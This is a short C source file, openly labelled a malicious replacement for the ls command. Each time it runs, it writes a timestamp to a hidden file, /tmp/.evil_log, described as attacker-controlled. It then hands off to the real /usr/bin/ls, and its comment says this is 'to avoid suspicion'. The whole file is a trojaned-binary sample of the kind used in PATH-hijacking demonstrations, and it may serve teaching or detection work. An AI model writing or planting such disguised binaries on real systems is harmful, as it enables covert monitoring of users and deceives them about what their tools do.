// Malicious ls replacement
// Logs execution, then calls real ls

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    // Log to attacker-controlled file
    FILE *log = fopen("/tmp/.evil_log", "a");
    if (log) {
        fprintf(log, "ls executed at: %ld\n", time(NULL));
        fclose(log);
    }

    // Call real ls to avoid suspicion
    execv("/usr/bin/ls", argv);
    return 1;
}
